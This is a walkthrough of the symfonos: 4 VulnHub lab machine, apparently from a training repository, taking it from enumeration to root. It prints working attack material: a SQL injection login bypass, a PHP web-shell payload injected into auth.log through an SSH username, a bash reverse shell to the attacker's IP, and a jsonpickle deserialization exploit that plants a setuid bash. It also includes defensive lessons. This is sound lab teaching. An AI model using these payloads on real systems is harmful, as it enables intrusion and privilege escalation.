# symfonos: 4 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 4 |
| **Difficulty** | Intermediate (OSCP‑like; teaches "trying harder") |
| **Author** | Zayotic |
| **Released** | 20 August 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-4,347/> |
| **Download** | <https://vulnhub.com/entry/symfonos-4,347/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian 10 (OpenSSH 7.9p1, Apache httpd 2.4.38) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build"). The
> directory names, the leaked database password and the local web app port may differ
> between rebuilds, but the intended chain below is stable.

---

## 0. What you will learn

- How to **brute-force hidden files** with `ffuf`, then how to turn a directory's own
  contents into a **better wordlist**.
- How a redirect plus a **login form** can be bypassed with **SQL injection**
  (`admin' or 1=1-- -`) *and* with a weak **session check**.
- What **Local File Inclusion (LFI)** is, and that if the app appends `.log`, you can
  still read **log files** — including SSH authentication logs.
- **Log poisoning** of `/var/log/auth.log` to get **Remote Code Execution (RCE)** as
  `www-data`.
- How to **read source code that leaks passwords** (a hard-coded database credential
  that is also a user's password).
- What **insecure deserialization** of a cookie is, and how a Python app using
  **`jsonpickle`/pickle** running as root can be exploited to escalate privileges.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo arp-scan -l
```

```text
Interface: eth0, type: EN10MB, MAC: ...
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1      0a:00:27:00:00:00   Cadmus Computer Systems
192.168.56.101    08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **How to read it:** `arp-scan` and `netdiscover` both list live hosts. The `.1`
> address is the host/gateway; `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** a tiny attack surface — a web server and SSH. There is no
> "easy" service here; we must extract everything from the web app and reuse
> credentials we find on the filesystem.

![Nmap scan output](images/02-nmap.png)

### 2.2 Web — the page is only an image

Browsing to `http://192.168.56.101/` shows a single image and nothing else. Time to
brute-force.

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e / -fc 403 | tee root.ffuf
```

```text
gods                    [Status: 301, Size: 316]
```

> **Why it works:** `ffuf` replaces `FUZZ` with each wordlist entry and reports
> everything that is not a `403`. We found `http://192.168.56.101/gods/`.

```bash
curl -s http://192.168.56.101/gods/
```

```text
<a href="hades.log">hades.log</a>
<a href="poseidon.log">poseidon.log</a>
<a href="medusa.log">medusa.log</a>
```

Each log file contains a **single word** inside. Read them:

```bash
for f in hades poseidon medusa; do echo "== $f =="; curl -s http://192.168.56.101/gods/$f.log; echo; done
```

```text
== hades ==
cerberus
== poseidon ==
atlantis
== medusa ==
gorgon
```

> **Why it works:** a directory full of short "log" files is a hidden **wordlist**.
> Take every word you find and reuse it — this is the enumeration trick the box wants
> you to learn.

### 2.3 Turn the contents into a wordlist and brute-force again

Put the harvested words into a file and use them as candidate **file names** (adding a
`.php` extension):

```bash
printf 'cerberus\natlantis\ngorgon\nhades\nposeidon\nmedusa\nsea\n' > words.txt
ffuf -ic -c -u http://192.168.56.101/FUZZ.php -w words.txt
```

```text
sea                     [Status: 302, Size: 0]
```

We discovered `http://192.168.56.101/sea.php`. Visiting it **redirects** us to
`atlantis.php`, which presents a **login form**.

> **Why it works:** the harvested words `.php` files. `sea.php` returns a `302`
> redirect to the login page — a hint that `sea.php` is the interesting "post-login"
> page and `atlantis.php` is the gate in front of it.

![Directory and file enumeration](images/03-enum.png)

---

## 3. Foothold

### 3.1 Bypass the login

Visit `http://192.168.56.101/atlantis.php`. Try to **log in with a SQL injection**:

```text
Username: admin' or 1=1-- -
Password: whatever
```

```text
302 Found -> Location: sea.php
```

> **Why it works:** the login query is roughly
> `SELECT ... WHERE user='$u' AND pass='$p'`. Our username closes the quote and makes
> the condition `1=1`, so the query returns a row and we "authenticate". The `-- -`
> comments out the rest. This is a **blind boolean SQL injection** — `admin' and
> 1=2-- -` is rejected, which proves the injection point. You can automate the dump
> with `sqlmap -r atlantis.req --batch`.

**A second, even simpler bypass:** the page after login only checks
`isset($_SESSION['logged_in'])`, **not its value**. Submitting *any* wrong credentials
still sets the session, so if you then request `sea.php` directly you are let in.

### 3.2 Exploit the LFI in `sea.php`

`sea.php` has a dropdown that loads a "god" file and displays its log. The URL looks
like:

```text
http://192.168.56.101/sea.php?g=hades
```

The app appends `.log` to our input and reads the file, so it *seems* limited to
`/gods`. But we can still reach **any `.log`-suffixed file on disk**:

```text
http://192.168.56.101/sea.php?g=../../../../var/log/auth
```

> **Why it works:** this is a **Local File Inclusion** / directory traversal. `../`
> climbs out of the web root. Because the app appends `.log`, we target files whose
> name ends in `.log` — and `sshd` writes **`/var/log/auth.log`**, which is perfect for
> poisoning. **Note:** the exact parameter name (`g`, `god`, `url`) varies by build.

![Local File Inclusion](images/04-lfi.png)

### 3.3 Poison the SSH log → RCE

Every failed SSH login records the **username** in `auth.log`. Put PHP in the
username:

```bash
ssh '<?php system($_GET["c"]); ?>'@192.168.56.101 -o PreferredAuthentications=password
```

This fails, but the string `<?php system($_GET["c"]); ?>` is now written into
`/var/log/auth.log`. Include the log through the LFI and pass a command:

```text
http://192.168.56.101/sea.php?g=../../../../var/log/auth&c=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the LFI reads `auth.log`, PHP parses and **executes** the code we
> injected into it, and `system($_GET['c'])` runs our command as the web user.
> **LFI + log poisoning = RCE.**

### 3.4 Get a reverse shell

```bash
nc -lvnp 4444
```

Then request the log with a command that calls back (URL-encode as needed):

```text
http://192.168.56.101/sea.php?g=../../../../var/log/auth&c=bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
```

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

### 3.5 Read the leaked credential and pivot

Read `atlantis.php` through the LFI using the PHP filter (so it is not executed):

```text
http://192.168.56.101/sea.php?g=php://filter/convert.base64-encode/resource=../atlantis
```

```text
PD9waHAg...   (base64 — decode it)
```

```bash
echo 'PD9waHAg...' | base64 -d
```

```php
$db_user = "root";
$db_pass = "yVdPT0VBWHU0T0FRTnBW";
```

> **Why it works:** the `php://filter/convert.base64-encode` wrapper returns the file
> **as text** (base64) instead of running it, so we can read the source and its
> hard-coded credential. That same password is reused for the local user
> **`poseidon`**.

```bash
ssh poseidon@192.168.56.101
# password: yVdPT0VBWHU0T0FRTnBW
```

![Shell and leaked credentials](images/05-foothold.png)

---

## 4. Privilege escalation

### 4.1 Find a service running as root

Check what is listening **only on localhost**:

```bash
ss -tlnp
```

```text
LISTEN  0  128  127.0.0.1:8080  0.0.0.0:*  users:(("python3",pid=...,fd=...))
```

Look at the process detail:

```bash
ps aux | grep -i python
```

```text
root  1234  python3 /opt/app/...  (listening on 8080)
```

> **Why it works:** a web app bound to `127.0.0.1` is not reachable from outside — but
> it *is* running as **root**. We need to reach it from our Kali session. Use an SSH
> tunnel (`ssh -L 8080:127.0.0.1:8080 poseidon@192.168.56.101`), or simply `curl` it
> from the target itself.

### 4.2 Read the application source

```bash
ls -l /opt
cat /opt/*/*.py 2>/dev/null
```

```python
import jsonpickle, base64
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    user = request.cookies.get('user')
    if user:
        data = jsonpickle.decode(base64.b64decode(user))   # <-- UNSAFE
        ...
```

> **Why it works:** `jsonpickle` (and Python's `pickle`) can reconstruct **arbitrary
> objects** from untrusted data. When the app **`decode`s a cookie we control**, the
> object's `__reduce__` method is invoked on the server — as **root**. This is
> **insecure deserialization**.

### 4.3 Craft the pickle payload

```bash
cat > exploit.py <<'EOF'
import jsonpickle, base64, os

class RCE(object):
    def __reduce__(self):
        cmd = 'cp /bin/bash /tmp/suidbash; chmod +s /tmp/suidbash'
        return os.system, (cmd,)

payload = base64.b64encode(jsonpickle.encode(RCE()).encode())
print(payload.decode())
EOF
python3 exploit.py
```

```text
eyJweS9vYmplY3QiOiAiX19tYWluX18uUkNFIiwgInB5L3JlZHVjZSI6IFsi...  (long string)
```

> **Why it works:** `__reduce__` tells Python how to rebuild the object. We return the
> pair `(os.system, (cmd,))`, so unpickling runs `os.system(cmd)` — planting a
> **setuid Bash** at `/tmp/suidbash` with the privileges of the process that
> deserializes it (root).

### 4.4 Trigger it

Send the payload in the `user` cookie (Burp Suite or `curl`):

```bash
curl -s -b 'user=<paste-the-base64-payload-here>' http://127.0.0.1:8080/
ls -l /tmp/suidbash
/tmp/suidbash -p
```

```text
-rwsr-sr-x 1 root root /tmp/suidbash
# whoami
root
```

> **Why it works:** the root app deserializes our cookie, our command runs as root,
> and the setuid bit lets us keep root when we run it ourselves.

![Privilege escalation to root](images/06-privesc.png)

### 4.5 The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on rooting symfonos:4!
(symfonos root proof)
```

![Root flag](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Directory contents reused as a wordlist | `/gods/*.log` | Enables discovery of `sea.php` |
| 2 | SQL injection in the login form | `atlantis.php` | Authentication bypass |
| 3 | Weak session check (`isset` only) | `sea.php` | Bypasses the login without valid creds |
| 4 | Local File Inclusion / path traversal | `sea.php?g=...` (appends `.log`) | Arbitrary file read |
| 5 | Log poisoning of `auth.log` | `/var/log/auth.log` + LFI | Remote Code Execution as `www-data` |
| 6 | Hard-coded DB password reused for a user | `atlantis.php` → `poseidon` | Lateral movement to `poseidon` |
| 7 | Insecure deserialization | Root Python app on `127.0.0.1:8080` (`jsonpickle`) | Root code execution |

## 6. Defensive lessons (blue team)

- **Use parameterised queries / prepared statements.** A login form should never be
  built by string concatenation; SQL injection would be impossible.
- **Check session *values*, not just existence.** `isset($_SESSION['logged_in'])` is
  not authentication. Compare against `=== true` and rotate session IDs.
- **Never concatenate user input into `include`/`file_get_contents`.** Validate against
  an allow-list of permitted filenames and reject `../`.
- **Do not let untrusted input reach logs the app can include.** Restrict web-server
  read access, and never `include` anything under `/var/log`.
- **Do not hard-code credentials, and never reuse them.** Secrets belong in a vault,
  and one password must never unlock several identities.
- **Never deserialize untrusted data.** `pickle`/`jsonpickle` are not safe for cookies
  or user input. Use a signed, data-only format (e.g. a JWT with a fixed schema).
- **Bind admin/dev services with least privilege.** A localhost web app should not run
  as `root`; use a dedicated low-privilege service account.
- **Detection ideas:** alert on SQL keyword patterns in web requests (`OR 1=1`, `--`),
  on `php://filter` or `../` in URLs, on SSH clients submitting `<?php` usernames, and
  on new setuid files in `/tmp`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/symfonos-4,347/>
- Community writeups consulted:
  - [Vulnhub: Symfonos 4 — ikuamike](https://blog.ikuamike.io/posts/2021/symfonos4/)
  - [Symfonos:4 Walkthrough — Tuk Bahadur Kumhal (Medium)](https://tukbdr.medium.com/symfonos-4-vulnhub-walkthrough-b31b426cbb30)
- Vendor advisories / docs:
  - [HackTricks — Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
  - [Into the Jar: jsonpickle exploitation — Versprite](https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/)
  - [HackTricks — File Inclusion / LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
  - [GTFOBins](https://gtfobins.github.io/) — abusing SUID/sudo binaries
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`ip a` / `arp-scan`)
- [ ] `images/02-nmap.png` — port/service scan (22, 80)
- [ ] `images/03-enum.png` — `/gods` and discovery of `sea.php`
- [ ] `images/04-lfi.png` — confirming the LFI in `sea.php`
- [ ] `images/05-foothold.png` — log-poisoning RCE / reverse shell
- [ ] `images/06-privesc.png` — `jsonpickle` deserialization → setuid Bash → root
- [ ] `images/07-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
